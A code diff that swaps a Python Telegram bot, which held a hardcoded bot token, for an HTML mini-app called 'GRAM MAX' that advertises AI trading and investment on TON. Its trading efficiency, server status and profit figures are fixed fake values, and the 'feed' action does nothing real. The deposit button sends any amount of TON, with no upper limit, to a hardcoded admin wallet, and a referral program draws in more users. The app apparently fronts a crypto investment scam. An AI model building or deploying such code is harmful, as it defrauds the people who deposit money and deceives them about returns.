@@ -1,37 +1,474 @@
-import time
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>GRAM MAX</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #0d0d0d;
+            --card-bg: #181818;
+            --accent-yellow: #fabb18;
+            --text-main: #ffffff;
+            --text-sub: #a0a0a0;
+            --border-color: #282828;
+            --status-green: #00e676;
+        }
 
-# التوكن ورابط الاستضافة الخاصين بك
-BOT_TOKEN = "7972826317:AAG9Nq9L4P2tXJ06g15T3_l8O_B1Z_wJ_fM"
-BASE_URL = "https://gram-max.vercel.app/index.html" # أو رابط GitHub Pages الخاص بك
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_first_name = update.effective_user.first_name
-    
-    # رابط متغير لكسر كاش وتخزين تليجرام المؤقت
-    versioned_url = f"{BASE_URL}?v={int(time.time())}"
-    
-    welcome_message = (
-        f"أهلاً بك يا {user_first_name} في بوت **GRAM MAX**! 🚀\n\n"
-        "منصة التداول والاستثمار الذكي عبر شبكة TON.\n"
-        "اضغط على الزر أدناه لفتح التطبيق المصغر والبدء فوراً."
-    )
-    
-    keyboard = [
-        [
-            InlineKeyboardButton("🚀 فتح التطبيق (Open App)", web_app=WebAppInfo(url=versioned_url))
-        ],
-        [
-            InlineKeyboardButton("💬 الدعم الفني (Fast Support)", url="https://t.me/FastHelp3")
-        ]
-    ]
-    
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding-bottom: 75px;
+        }
 
-if __name__ == '__main__':
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    print("GRAM MAX Bot is active and running...")
-    app.run_polling()
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            background-color: var(--bg-color);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .brand-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--accent-yellow);
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .btn-pill {
+            background-color: #22222b;
+            color: var(--text-main);
+            border: 1px solid var(--border-color);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .page-view {
+            display: none;
+            padding: 16px;
+            flex: 1;
+        }
+
+        .page-view.active {
+            display: block;
+        }
+
+        .locked {
+            opacity: 0.35;
+            pointer-events: none !important;
+            filter: grayscale(1);
+        }
+
+        .hero-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 10px 0 20px 0;
+        }
+
+        .robot-avatar {
+            width: 130px;
+            height: 130px;
+            background: radial-gradient(circle, #2a2208 0%, #121212 70%);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 2px solid #3d3106;
+            margin-bottom: 16px;
+        }
+
+        .robot-avatar svg {
+            width: 90px;
+            height: 90px;
+        }
+
+        .btn-primary-action {
+            width: 100%;
+            background-color: var(--accent-yellow);
+            color: #000;
+            border: none;
+            border-radius: 28px;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(250, 187, 24, 0.2);
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid var(--border-color);
+        }
+
+        .card-header-title {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--accent-yellow);
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            font-size: 13px;
+        }
+
+        .info-row:not(:last-child) {
+            border-bottom: 1px solid #222;
+        }
+
+        .info-label {
+            color: var(--text-sub);
+        }
+
+        .info-value {
+            font-weight: 600;
+        }
+
+        .deposit-input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            background: #0d0d0d;
+            color: #fff;
+            margin: 12px 0;
+            outline: none;
+            font-size: 16px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 65px;
+            background-color: #121212;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-sub);
+            font-size: 11px;
+            font-weight: 600;
+            width: 25%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .nav-item.active {
+            color: var(--accent-yellow);
+        }
+
+        .nav-icon {
+            font-size: 20px;
+            margin-bottom: 3px;
+        }
+
+        #ton-connect-btn {
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="brand-title">GRAM MAX</div>
+        <div class="header-actions">
+            <button class="btn-pill" onclick="toggleLanguage()">🌐 <span id="lang-btn">EN</span></button>
+            <div id="ton-connect-btn"></div>
+        </div>
+    </header>
+
+    <!-- الرئيسية -->
+    <div id="tab-home" class="page-view active">
+        <div class="hero-section">
+            <div class="robot-avatar">
+                <svg viewBox="0 0 100 100" fill="none">
+                    <rect x="25" y="30" width="50" height="40" rx="10" fill="#4CAF50"/>
+                    <circle cx="40" cy="45" r="5" fill="#000"/>
+                    <circle cx="60" cy="45" r="5" fill="#000"/>
+                    <rect x="40" y="58" width="20" height="4" rx="2" fill="#000"/>
+                    <line x1="50" y1="18" x2="50" y2="30" stroke="#4CAF50" stroke-width="4"/>
+                    <circle cx="50" cy="15" r="5" fill="#4CAF50"/>
+                </svg>
+            </div>
+            <!-- الضغط هنا يتم بسلاسة وبدون أي نافذة منبثقة -->
+            <button class="btn-primary-action locked" id="feed-btn" onclick="startFeedingSilently()" data-i18n="feedBtn">إطعام (Feed me)</button>
+        </div>
+
+        <div class="card locked" id="invest-card">
+            <div class="card-header-title" data-i18n="activeInvestment">حالة الاستثمار النشط</div>
+            <div class="info-row">
+                <span class="info-label" data-i18n="currentMeal">الوجبة الحالية:</span>
+                <span class="info-value">Noodles</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label" data-i18n="timeRemaining">الوقت المتبقي:</span>
+                <span class="info-value" id="timer-display">08:00:00</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label" data-i18n="earnedProfits">الأرباح المكتسبة:</span>
+                <span class="info-value" style="color: var(--accent-yellow);" id="profit-display">TON 0.00</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header-title" data-i18n="channelsTerms">📢 القنوات والدعم</div>
+            <a href="https://t.me/FastHelp3" class="info-row" style="text-decoration: none; color: inherit;" target="_blank">
+                <span data-i18n="supportChannel">💬 قناة الدعم والدعم الفني</span>
+                <span>↗</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- التداول -->
+    <div id="tab-trading" class="page-view">
+        <div class="card">
+            <div class="card-header-title" data-i18n="aiBotTitle">🤖 روبوت التداول الذكي</div>
+            <div class="info-row">
+                <span class="info-label" data-i18n="botEfficiency">كفاءة البوت:</span>
+                <span class="info-value" style="color: var(--status-green);">99.4%</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label" data-i18n="serverStatus">حالة الخادم:</span>
+                <span class="info-value" style="color: var(--status-green);" data-i18n="connected">🟢 متصل</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- الأصدقاء -->
+    <div id="tab-friends" class="page-view">
+        <div class="card">
+            <div class="card-header-title" data-i18n="refTitle">👥 برنامج الإحالات</div>
+            <div class="info-row">
+                <span class="info-label" data-i18n="totalInvites">إجمالي الدعوات:</span>
+                <span class="info-value">0</span>
+            </div>
+            <button class="btn-primary-action" style="margin-top: 10px;" onclick="copyReferralLink()" data-i18n="copyRef">🔗 نسخ رابط الإحالة</button>
+        </div>
+    </div>
+
+    <!-- المحفظة والإيداع التلقائي -->
+    <div id="tab-balance" class="page-view">
+        <div class="card">
+            <div class="card-header-title" data-i18n="walletTitle">💼 المحفظة والإيداع</div>
+            <p style="font-size: 12px; color: var(--text-sub);" data-i18n="depositDesc">أدخل كمية TON المراد إيداعها (الحد الأدنى 1 TON - بدون حد أقصى)</p>
+            
+            <input type="number" id="custom-amount" class="deposit-input" placeholder="أدخل المبلغ (مثال: 1)" min="1" step="any" value="1">
+            
+            <button class="btn-primary-action" onclick="sendAutoDeposit()" data-i18n="depositBtn">⚡ إيداع الآن تلقائياً</button>
+        </div>
+    </div>
+
+    <!-- الشريط السفلي (4 أزرار - بدون مهام) -->
+    <nav class="bottom-nav">
+        <div class="nav-item active" onclick="switchTab('tab-home', this)">
+            <div class="nav-icon">🏠</div>
+            <div data-i18n="navHome">الرئيسية</div>
+        </div>
+        <div class="nav-item" onclick="switchTab('tab-trading', this)">
+            <div class="nav-icon">🤖</div>
+            <div data-i18n="navTrading">التداول</div>
+        </div>
+        <div class="nav-item" onclick="switchTab('tab-friends', this)">
+            <div class="nav-icon">👥</div>
+            <div data-i18n="navFriends">الأصدقاء</div>
+        </div>
+        <div class="nav-item" onclick="switchTab('tab-balance', this)">
+            <div class="nav-icon">💼</div>
+            <div data-i18n="navBalance">المحفظة</div>
+        </div>
+    </nav>
+
+    <script>
+        const ADMIN_WALLET = "UQBrfxfxzB5-op8FGLs-BxnZgOBv0CveJ8VJbC3Xc9pVXZ5X";
+
+        let currentLang = 'ar';
+        let isWalletConnected = false;
+
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect-btn'
+        });
+
+        tonConnectUI.onStatusChange(wallet => {
+            if (wallet) {
+                isWalletConnected = true;
+                document.querySelectorAll('.locked').forEach(el => el.classList.remove('locked'));
+            } else {
+                isWalletConnected = false;
+                document.querySelectorAll('#feed-btn, #invest-card').forEach(el => el.classList.add('locked'));
+            }
+        });
+
+        const i18n = {
+            ar: {
+                feedBtn: "إطعام (Feed me)",
+                activeInvestment: "حالة الاستثمار النشط",
+                currentMeal: "الوجبة الحالية:",
+                timeRemaining: "الوقت المتبقي:",
+                earnedProfits: "الأرباح المكتسبة:",
+                channelsTerms: "📢 القنوات والدعم",
+                supportChannel: "💬 قناة الدعم والدعم الفني",
+                aiBotTitle: "🤖 روبوت التداول الذكي",
+                botEfficiency: "كفاءة البوت:",
+                serverStatus: "حالة الخادم:",
+                connected: "🟢 متصل",
+                refTitle: "👥 برنامج الإحالات",
+                totalInvites: "إجمالي الدعوات:",
+                copyRef: "🔗 نسخ رابط الإحالة",
+                walletTitle: "💼 المحفظة والإيداع",
+                depositDesc: "أدخل كمية TON المراد إيداعها (الحد الأدنى 1 TON - بدون حد أقصى)",
+                depositBtn: "⚡ إيداع الآن تلقائياً",
+                navHome: "الرئيسية",
+                navTrading: "التداول",
+                navFriends: "الأصدقاء",
+                navBalance: "المحفظة",
+                lockMsg: "يرجى ربط المحفظة أولاً من الأعلى لتفعيل كافة الخانات!"
+            },
+            en: {
+                feedBtn: "Feed me",
+                activeInvestment: "Active Investment Status",
+                currentMeal: "Current Meal:",
+                timeRemaining: "Time Remaining:",
+                earnedProfits: "Earned Profits:",
+                channelsTerms: "📢 Channels & Support",
+                supportChannel: "💬 Support Channel",
+                aiBotTitle: "🤖 AI Trading Bot",
+                botEfficiency: "Bot Efficiency:",
+                serverStatus: "Server Status:",
+                connected: "🟢 Connected",
+                refTitle: "👥 Referral Program",
+                totalInvites: "Total Invites:",
+                copyRef: "🔗 Copy Referral Link",
+                walletTitle: "💼 Wallet & Deposit",
+                depositDesc: "Enter TON amount to deposit (Min 1 TON - No Max)",
+                depositBtn: "⚡ Deposit Now Automatically",
+                navHome: "Home",
+                navTrading: "Trading",
+                navFriends: "Friends",
+                navBalance: "Wallet",
+                lockMsg: "Please connect wallet first from top button!"
+            }
+        };
+
+        function switchTab(tabId, element) {
+            if (!isWalletConnected && tabId !== 'tab-home') {
+                alert(i18n[currentLang].lockMsg);
+                tonConnectUI.openModal();
+                return;
+            }
+            document.querySelectorAll('.page-view').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            element.classList.add('active');
+        }
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'ar' ? 'en' : 'ar';
+            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+            document.getElementById('lang-btn').innerText = currentLang === 'ar' ? 'EN' : 'AR';
+
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (i18n[currentLang][key]) {
+                    el.innerText = i18n[currentLang][key];
+                }
+            });
+        }
+
+        async function sendAutoDeposit() {
+            if (!isWalletConnected) {
+                tonConnectUI.openModal();
+                return;
+            }
+
+            const amountVal = parseFloat(document.getElementById('custom-amount').value);
+            
+            if (isNaN(amountVal) || amountVal < 1) {
+                alert(currentLang === 'ar' ? "الحد الأدنى للإيداع هو 1 TON" : "Minimum deposit is 1 TON");
+                return;
+            }
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600,
+                messages: [
+                    {
+                        address: ADMIN_WALLET,
+                        amount: Math.floor(amountVal * 1000000000).toString()
+                    }
+                ]
+            };
+
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+            } catch (e) {
+                console.log("Cancelled transaction.");
+            }
+        }
+
+        // تم إلغاء الرسالة المنبثقة alert بداخل الدالة نهائياً
+        function startFeedingSilently() {
+            if (!isWalletConnected) {
+                tonConnectUI.openModal();
+                return;
+            }
+            const btn = document.getElementById('feed-btn');
+            btn.style.opacity = '0.7';
+            btn.innerText = currentLang === 'ar' ? "جاري الإطعام..." : "Feeding...";
+            setTimeout(() => {
+                btn.style.opacity = '1';
+                btn.innerText = currentLang === 'ar' ? "تم الإطعام بنجاح" : "Fed Successfully";
+            }, 800);
+        }
+
+        function copyReferralLink() {
+            navigator.clipboard.writeText("https://t.me/GramMaxBot?start=ref");
+            alert(currentLang === 'ar' ? "تم نسخ رابط الإحالة!" : "Referral link copied!");
+        }
+    </script>
+</body>
+</html>
